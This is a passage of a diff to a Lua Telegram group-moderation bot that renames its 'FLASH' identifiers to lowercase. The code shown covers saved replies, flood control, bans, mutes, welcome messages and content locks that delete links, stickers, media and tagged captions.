+flashdx1:set(flash.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
 end
 if msg.content_.voice_ then
-FLASHdx1:set(FLASH.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
+flashdx1:set(flash.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
 end
 if msg.content_.audio_ then
-FLASHdx1:set(FLASH.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
+flashdx1:set(flash.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
 end
 if msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -2143,88 +2143,88 @@ end
 if msg.content_.photo_.sizes_[3] then
 photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
-FLASHdx1:set(FLASH.."photo_repall"..content_text, photo_in_all_groups)
+flashdx1:set(flash.."photo_repall"..content_text, photo_in_all_groups)
 end
 if msg.content_.animation_ then
-FLASHdx1:set(FLASH.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
+flashdx1:set(flash.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
 end
 if msg.content_.text_ then
-FLASHdx1:set(FLASH.."text_repall"..content_text, msg.content_.text_)
+flashdx1:set(flash.."text_repall"..content_text, msg.content_.text_)
 end 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الرد . \n', 1, 'md') 
-FLASHdx1:del(FLASH.."addreply2:"..msg.sender_user_id_)
-FLASHdx1:del(FLASH..'delrep_sudo')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ الرد . \n', 1, 'md') 
+flashdx1:del(flash.."addreply2:"..msg.sender_user_id_)
+flashdx1:del(flash..'delrep_sudo')
 return false end end
-if msg.content_.text_ and not FLASHdx1:get(FLASH..'lock_reeeep'..msg.chat_id_) then
-if FLASHdx1:get(FLASH.."video_repall"..msg.content_.text_) then
-sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, FLASHdx1:get(FLASH.."video_repall"..msg.content_.text_))
+if msg.content_.text_ and not flashdx1:get(flash..'lock_reeeep'..msg.chat_id_) then
+if flashdx1:get(flash.."video_repall"..msg.content_.text_) then
+sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, flashdx1:get(flash.."video_repall"..msg.content_.text_))
 end
-if FLASHdx1:get(FLASH.."file_repall"..msg.content_.text_) then
-sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, FLASHdx1:get(FLASH.."file_repall"..msg.content_.text_))
+if flashdx1:get(flash.."file_repall"..msg.content_.text_) then
+sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, flashdx1:get(flash.."file_repall"..msg.content_.text_))
 end
-if FLASHdx1:get(FLASH.."voice_repall"..msg.content_.text_)  then
-sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH.."voice_repall"..msg.content_.text_))
+if flashdx1:get(flash.."voice_repall"..msg.content_.text_)  then
+sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash.."voice_repall"..msg.content_.text_))
 end
-if FLASHdx1:get(FLASH.."audio_repall"..msg.content_.text_)  then
-sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH.."audio_repall"..msg.content_.text_))
+if flashdx1:get(flash.."audio_repall"..msg.content_.text_)  then
+sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash.."audio_repall"..msg.content_.text_))
 end
-if FLASHdx1:get(FLASH.."photo_repall"..msg.content_.text_)  then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH.."photo_repall"..msg.content_.text_))
+if flashdx1:get(flash.."photo_repall"..msg.content_.text_)  then
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash.."photo_repall"..msg.content_.text_))
 end
-if  FLASHdx1:get(FLASH.."gif_repall"..msg.content_.text_) then
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, FLASHdx1:get(FLASH.."gif_repall"..msg.content_.text_))
+if  flashdx1:get(flash.."gif_repall"..msg.content_.text_) then
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, flashdx1:get(flash.."gif_repall"..msg.content_.text_))
 end
-if FLASHdx1:get(FLASH.."stecker_repall"..msg.content_.text_) then
-sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, FLASHdx1:get(FLASH.."stecker_repall"..msg.content_.text_))
+if flashdx1:get(flash.."stecker_repall"..msg.content_.text_) then
+sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, flashdx1:get(flash.."stecker_repall"..msg.content_.text_))
 end
-if FLASHdx1:get(FLASH.."text_repall"..msg.content_.text_) then
-function FLASH(extra,result,success)
+if flashdx1:get(flash.."text_repall"..msg.content_.text_) then
+function flash(extra,result,success)
 if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
-local FLASHdxs = (FLASHdx1:get('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-local user_msgs = FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local Text = FLASHdx1:get(FLASH.."text_repall"..msg.content_.text_)
+local flashdxs = (flashdx1:get('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+local user_msgs = flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local Text = flashdx1:get(flash.."text_repall"..msg.content_.text_)
 local Text = Text:gsub('#username',(username or 'لا يوجد')) 
 local Text = Text:gsub('#name','['..result.first_name_..']')
 local Text = Text:gsub('#id',msg.sender_user_id_)
-local Text = Text:gsub('#msgs',(user_msgs + FLASHdxs or 'لا يوجد'))
-local Text = Text:gsub('#stast',(renk_FLASH(msg) or 'لا يوجد'))
-FLASHdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
+local Text = Text:gsub('#msgs',(user_msgs + flashdxs or 'لا يوجد'))
+local Text = Text:gsub('#stast',(renk_flash(msg) or 'لا يوجد'))
+flashdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
 end
-getUser(msg.sender_user_id_, FLASH)
+getUser(msg.sender_user_id_, flash)
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Flood Max 
 local flmax = 'flood:max:'..msg.chat_id_
-if not FLASHdx1:get(FLASH..flmax) then
+if not flashdx1:get(flash..flmax) then
 floodMax = 5
 else
-floodMax = tonumber(FLASHdx1:get(FLASH..flmax))
+floodMax = tonumber(flashdx1:get(flash..flmax))
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Msg
 local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
-if not FLASHdx1:get(FLASH..pm) then
+if not flashdx1:get(flash..pm) then
 msgs = 0
 else
-msgs = tonumber(FLASHdx1:get(FLASH..pm))
+msgs = tonumber(flashdx1:get(flash..pm))
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Flood Check Time
 local TIME_CHECK = 2
 -------- Flood Check
 local hashflood = 'anti-flood:'..msg.chat_id_
 if msgs > (floodMax - 1) then
-if FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) == 'Kicked' then
+if flashdx1:get(flash..'floodstatus'..msg.chat_id_) == 'Kicked' then
 del_all_msgs(msg.chat_id_, msg.sender_user_id_)
 chat_kick(msg.chat_id_, msg.sender_user_id_)
-local FLASH = '❅∫ العضو ('..msg.sender_user_id_..') \n❅∫ قام بالتكرار المحدد تم طرده  '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 12, string.len(msg.sender_user_id_))
-elseif FLASHdx1:get(FLASH..'floodstatus'..msg.chat_id_) == 'DelMsg' then
+local flash = '❅∫ العضو ('..msg.sender_user_id_..') \n❅∫ قام بالتكرار المحدد تم طرده  '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 12, string.len(msg.sender_user_id_))
+elseif flashdx1:get(flash..'floodstatus'..msg.chat_id_) == 'DelMsg' then
 del_all_msgs(msg.chat_id_, msg.sender_user_id_)
 else
 del_all_msgs(msg.chat_id_, msg.sender_user_id_)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local check_username = function(extra, result, success)
 local fname = result.first_name_ or ""
 local lname = result.last_name_ or ""
@@ -2233,12 +2233,12 @@ local username = result.username_
 local svuser = "user:Name" .. result.id_
 local id = result.id_
 if username then
-FLASHdx1:set(FLASH..svuser, "@" .. username)
+flashdx1:set(flash..svuser, "@" .. username)
 else
-FLASHdx1:set(FLASH..svuser, name)
+flashdx1:set(flash..svuser, name)
 end end
 getUser(msg.sender_user_id_, check_username)
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_banned(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2246,7 +2246,7 @@ local chat = msg.chat_id_
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 return
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_muted(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2254,7 +2254,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 return
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_gbanned(msg.sender_user_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2263,7 +2263,7 @@ chat_kick(msg.chat_id_, msg.sender_user_id_)
 delete_msg(chat,msgs)
 return
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_mutedall(msg.sender_user_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2271,43 +2271,43 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 return
 end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
+--     By Developer flash     -- 
+if flashdx1:get(flash..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 return
 end
---     By Developer FLASH     -- 
-FLASHdx1:incr(FLASH..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
-FLASHdx1:incr(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-FLASHdx1:incr(FLASH..'group:msgs'..msg.chat_id_)
+--     By Developer flash     -- 
+flashdx1:incr(flash..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx1:incr(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+flashdx1:incr(flash..'group:msgs'..msg.chat_id_)
 if msg.content_.ID == "MessagePinMessage" then
-if FLASHdx1:get(FLASH..'pinnedmsg'..msg.chat_id_) and FLASHdx1:get(FLASH..'bot:pin:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'pinnedmsg'..msg.chat_id_) and flashdx1:get(flash..'bot:pin:mute'..msg.chat_id_) then
 unpinmsg(msg.chat_id_)
-local pin_id = FLASHdx1:get(FLASH..'pinnedmsg'..msg.chat_id_)
+local pin_id = flashdx1:get(flash..'pinnedmsg'..msg.chat_id_)
 pinmsg(msg.chat_id_,pin_id,0)
 end end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH..'bot:viewget'..msg.sender_user_id_) then
+--     By Developer flash     -- 
+if flashdx1:get(flash..'bot:viewget'..msg.sender_user_id_) then
 if not msg.forward_info_ then
-if FLASHdx1:get(FLASH..'lang:gp:'..msg.chat_id_) then
+if flashdx1:get(flash..'lang:gp:'..msg.chat_id_) then
 end
-FLASHdx1:del(FLASH..'bot:viewget'..msg.sender_user_id_)
+flashdx1:del(flash..'bot:viewget'..msg.sender_user_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ مشاهدات المنشور '..msg.views_..' مشاهده تقريبا .', 1, 'md')
-FLASHdx1:del(FLASH..'bot:viewget'..msg.sender_user_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ مشاهدات المنشور '..msg.views_..' مشاهده تقريبا .', 1, 'md')
+flashdx1:del(flash..'bot:viewget'..msg.sender_user_id_)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Photo
 if msg_type == 'MSG:Photo' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2315,7 +2315,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Photo]")
 end end end
-if FLASHdx1:get(FLASH..'bot:photo:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:photo:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2324,17 +2324,17 @@ print("Deleted [Lock] [Photo]")
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Photo]")
-if FLASHdx1:get(FLASH..'bot:strict'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:strict'..msg.chat_id_) then
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 end end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2343,7 +2343,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Photo]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2351,7 +2351,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Photo]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2359,7 +2359,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Photo]")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2367,32 +2367,32 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Photo]")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Photo]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Markdown
 elseif msg_type == 'MSG:MarkDown' then
-if FLASHdx1:get(FLASH..'markdown:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'markdown:lock'..msg.chat_id_) then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Document
 elseif msg_type == 'MSG:Document' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2400,7 +2400,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Document]")
 end end end
-if FLASHdx1:get(FLASH..'bot:document:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:document:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2409,17 +2409,17 @@ print("Deleted [Lock] [Document]")
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Document]")
-if FLASHdx1:get(FLASH..'bot:strict'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:strict'..msg.chat_id_) then
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 end end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2428,7 +2428,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Document]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2436,7 +2436,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Document]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2444,7 +2444,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Document]")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2452,35 +2452,35 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Document]")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Document]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Inline
 elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
-if FLASHdx1:get(FLASH..'bot:inline:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:inline:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Inline]")
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Sticker
 elseif msg_type == 'MSG:Sticker' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
-if FLASHdx1:get(FLASH..'bot:sticker:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:sticker:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2488,7 +2488,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Sticker]")
 end end
 elseif msg_type == 'MSG:JoinByLink' then
-if FLASHdx1:get(FLASH..'bot:tgservice:jk'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:tgservice:jk'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_ 
@@ -2497,23 +2497,23 @@ print("Deleted [Lock] [Tgservice] [JoinByLink]")
 return
 end
 function get_welcome(extra,result,success)
-if FLASHdx1:get(FLASH..'get:welcome'..msg.chat_id_) then
-text = FLASHdx1:get(FLASH..'get:welcome'..msg.chat_id_)
+if flashdx1:get(flash..'get:welcome'..msg.chat_id_) then
+text = flashdx1:get(flash..'get:welcome'..msg.chat_id_)
 else
 text = '❅∫ هلا بالكمر 👋 ،\n❅∫ name ،\n❅∫ @user ،\n❅∫ في '..title_name(msg.chat_id_)..' ،\n'
 end
 local text = text:gsub('name',(result.first_name_ or ''))
 local text = text:gsub('lname',(result.last_name_ or ''))
 local text = text:gsub('user',(result.username_ or 'FAQY4'))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end 
-if FLASHdx1:get(FLASH.."bot:welcome"..msg.chat_id_) then
+if flashdx1:get(flash.."bot:welcome"..msg.chat_id_) then
 getUser(msg.sender_user_id_,get_welcome)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- New User Add
 elseif msg_type == 'MSG:NewUserAdd' then
-if FLASHdx1:get(FLASH..'bot:tgservice:jk'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:tgservice:jk'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2523,7 +2523,7 @@ return
 end
 if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
 if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'bot:bots:gkgk'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:bots:gkgk'..msg.chat_id_) then
 chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
 return false
 end end end
@@ -2531,26 +2531,26 @@ if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
 chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
 return false
 end
-if FLASHdx1:get(FLASH.."bot:welcome"..msg.chat_id_) then
-if FLASHdx1:get(FLASH..'get:welcome'..msg.chat_id_) then
-text = FLASHdx1:get(FLASH..'get:welcome'..msg.chat_id_)
+if flashdx1:get(flash.."bot:welcome"..msg.chat_id_) then
+if flashdx1:get(flash..'get:welcome'..msg.chat_id_) then
+text = flashdx1:get(flash..'get:welcome'..msg.chat_id_)
 else
 text = '❅∫ هلا بالكمر 👋 ،\n❅∫ name ،\n❅∫ @user ،\n❅∫ في '..title_name(msg.chat_id_)..' ،\n'
 end
 local text = text:gsub('name',(msg.content_.members_[0].first_name_ or ''))
 local text = text:gsub('lname',(msg.content_.members_[0].last_name_ or ''))
 local text = text:gsub('user',(msg.content_.members_[0].username_ or 'FAQY4'))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Contact
 elseif msg_type == 'MSG:Contact' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2558,22 +2558,22 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Contact]")
 end end end
-if FLASHdx1:get(FLASH..'bot:contact:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:contact:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Contact]")
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Audio
 elseif msg_type == 'MSG:Audio' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2581,7 +2581,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Audio]")
 end end end
-if FLASHdx1:get(FLASH..'bot:music:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:music:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2590,7 +2590,7 @@ print("Deleted [Lock] [Audio]")
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2598,7 +2598,7 @@ local chat = msg.chat_id_
